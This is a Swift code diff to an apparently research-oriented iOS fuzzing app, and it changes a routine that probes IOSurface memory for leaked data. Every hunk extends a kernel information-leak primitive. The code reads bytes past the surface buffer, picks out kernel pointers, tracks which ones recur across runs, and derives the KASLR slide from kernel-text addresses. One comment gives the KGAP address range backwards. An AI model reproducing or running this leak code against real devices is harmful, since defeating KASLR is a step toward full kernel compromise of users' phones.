@@ -1727,6 +1727,9 @@ func runMismatchTest(log: FuzzLog) {
 // Also scans the tail bytes (after pixel data) for dirty allocator residue.
 // Stores previous run's (offset, value) pairs for offset-based delta detection
 var _iosurfPrevTailValues: [(offset: Int, val: UInt64)] = []
+// Cross-run value frequency: tracks how many runs each value appeared in
+var _iosurfValFreq: [UInt64: Int] = [:]
+var _iosurfRunCount: Int = 0
 
 func runIOSurfaceLeak(log: FuzzLog, completion: @escaping () -> Void) {
     DispatchQueue.global(qos: .userInitiated).async {
@@ -1853,8 +1856,8 @@ func runIOSurfaceLeak(log: FuzzLog, completion: @escaping () -> Void) {
         surface.unlock(options: [], seed: nil)
         scanAddr("post_relock", base, allocSize)
 
-        // post_relock_tail: consistently readable — use for cross-run delta
-        let prtLen = 65536
+        // post_relock_tail: 128KB to sample more kernel heap pages
+        let prtLen = 131072
         var prtBuf = [UInt8](repeating: 0, count: prtLen)
         var prtOut: vm_size_t = 0
         let prtKr: kern_return_t = prtBuf.withUnsafeMutableBytes { b in
@@ -1866,62 +1869,58 @@ func runIOSurfaceLeak(log: FuzzLog, completion: @escaping () -> Void) {
         }
         if prtKr == 0 {
             var currentPairs: [(offset: Int, val: UInt64)] = []
+            var seenThisRun = Set<UInt64>()
             for qw in 0..<(Int(prtOut)/8) {
                 var v: UInt64 = 0
                 for b in 0..<8 { v |= UInt64(prtBuf[qw*8+b]) << (b*8) }
                 guard v >= 0xFFFFFE0000000000 && v != 0xFFFFFFFFFFFFFFFF else { continue }
+                // Filter repeating-byte fill patterns
                 let b0 = UInt8(v & 0xFF); guard v != UInt64(b0) &* 0x0101010101010101 else { continue }
-                // Tighter classification:
-                //   KTEXT  0xFFFFFFF000000000–0xFFFFFFF07FFFFFFF
-                //   KHEAP  0xFFFFFE0000000000–0xFFFFFEFFFFFFFFFF (XNU zone heap)
-                //   KGAP   0xFFFFFF0000000000–0xFFFFFEFFFFFFFFFF (driver/iommu gap)
-                //   KMMIO  0xFFFFFFF080000000+ (IOKit HW regs)
+                // Filter kernel sentinel/stack-guard values (top 60 bits all 1 — low nibble varies)
+                // e.g. 0xFFFFFFFFFFFFFFF8, FC, FD, FA, F0 — these are NOT pointers
+                guard (v & 0xFFFFFFFFFFFFFFF0) != 0xFFFFFFFFFFFFFFF0 else { continue }
+                // Tighter VA classification:
+                //   KTEXT  0xFFFFFFF000000000–0xFFFFFFF07FFFFFFF  (kernel code, KASLR target)
+                //   KHEAP  0xFFFFFE0000000000–0xFFFFFEFFFFFFFFFF  (XNU zone heap, KASLR-sensitive)
+                //   KGAP   0xFFFFFF0000000000–0xFFFFFEFFFFFFFFFF  (driver/iommu gap)
+                //   KMMIO  0xFFFFFFF080000000+                     (IOKit HW regs, fixed)
                 let cat: String
                 if v >= 0xFFFFFFF000000000 && v < 0xFFFFFFF080000000 { cat = "KTEXT" }
-                else if v >= 0xFFFFFFF080000000                       { cat = "KMMIO" }
+                else if v >= 0xFFFFFFF080000000                        { cat = "KMMIO" }
                 else if v >= 0xFFFFFE0000000000 && v <= 0xFFFFFEFFFFFFFFFF { cat = "KHEAP" }
-                else                                                   { cat = "KGAP"  }
+                else                                                    { cat = "KGAP"  }
                 step("  prt[+0x\(String(qw*8,radix:16))]=0x\(String(v,radix:16)) [\(cat)]")
                 currentPairs.append((offset: qw*8, val: v))
+                seenThisRun.insert(v)
             }
-            step("  post_relock_tail total: \(currentPairs.count) vals")
-            // Offset-based delta
-            let prev = _iosurfPrevTailValues
-            if prev.isEmpty {
-                step("DELTA: run 1 captured (\(currentPairs.count) vals) — tap again")
+            step("  post_relock_tail total: \(currentPairs.count) vals (after sentinel filter)")
+
+            // Frequency tracking: count how many runs each value has appeared in
+            _iosurfRunCount += 1
+            for v in seenThisRun { _iosurfValFreq[v, default: 0] += 1 }
+
+            // Print top recurring values (appear in 2+ runs)
+            let recurring = _iosurfValFreq.filter { $0.value >= 2 }.sorted { $0.value > $1.value }
+            if !recurring.isEmpty {
+                step("RECURRING (\(_iosurfRunCount) runs total):")
+                for (v, cnt) in recurring.prefix(20) {
+                    let cat: String
+                    if v >= 0xFFFFFFF000000000 && v < 0xFFFFFFF080000000 { cat = "KTEXT" }
+                    else if v >= 0xFFFFFFF080000000                        { cat = "KMMIO" }
+                    else if v >= 0xFFFFFE0000000000 && v <= 0xFFFFFEFFFFFFFFFF { cat = "KHEAP" }
+                    else                                                    { cat = "KGAP"  }
+                    let unslidBase: UInt64 = 0xFFFFFFF007004000
+                    var extra = ""
+                    if cat == "KTEXT" {
+                        let slide = v &- unslidBase
+                        if slide <= 0x80000000 { extra = " *** KASLR slide=0x\(String(slide,radix:16))" }
+                    }
+                    step("  ×\(cnt) 0x\(String(v,radix:16)) [\(cat)]\(extra)")
+                }
             } else {
-                let prevDict = Dictionary(uniqueKeysWithValues: prev.map { ($0.offset, $0.val) })
-                var nStable = 0, nChanged = 0, nNew = 0
-                var stableLines: [String] = [], changedLines: [String] = []
-                for p in currentPairs {
-                    if let pv = prevDict[p.offset] {
-                        if pv == p.val {
-                            nStable += 1
-                            stableLines.append("  STABLE[+0x\(String(p.offset,radix:16))]=0x\(String(p.val,radix:16))")
-                        } else {
-                            nChanged += 1
-                            changedLines.append("  CHANGED[+0x\(String(p.offset,radix:16))] was=0x\(String(pv,radix:16)) now=0x\(String(p.val,radix:16))")
-                        }
-                    } else {
-                        nNew += 1
-                    }
-                }
-                step("DELTA: stable=\(nStable) changed=\(nChanged) new=\(nNew)")
-                for l in stableLines  { step(l) }
-                for l in changedLines.prefix(30) { step(l) }
-                if changedLines.count > 30 { step("  ...+\(changedLines.count-30) more changed") }
-                // KASLR: any STABLE KTEXT ptr → compute slide
-                let unslidBase: UInt64 = 0xFFFFFFF007004000
-                for p in currentPairs {
-                    if p.val >= 0xFFFFFFF000000000 && p.val < 0xFFFFFFF080000000,
-                       let pv = prevDict[p.offset], pv == p.val {
-                        let slide = p.val &- unslidBase
-                        if slide <= 0x80000000 {
-                            step("  *** KASLR slide=0x\(String(slide,radix:16)) from stable KTEXT 0x\(String(p.val,radix:16))")
-                        }
-                    }
-                }
+                step("RECURRING: none yet (run \(_iosurfRunCount)) — keep tapping")
             }
+
             _iosurfPrevTailValues = currentPairs
         } else {
             step("  post_relock_tail: vm_read kr=\(prtKr)")
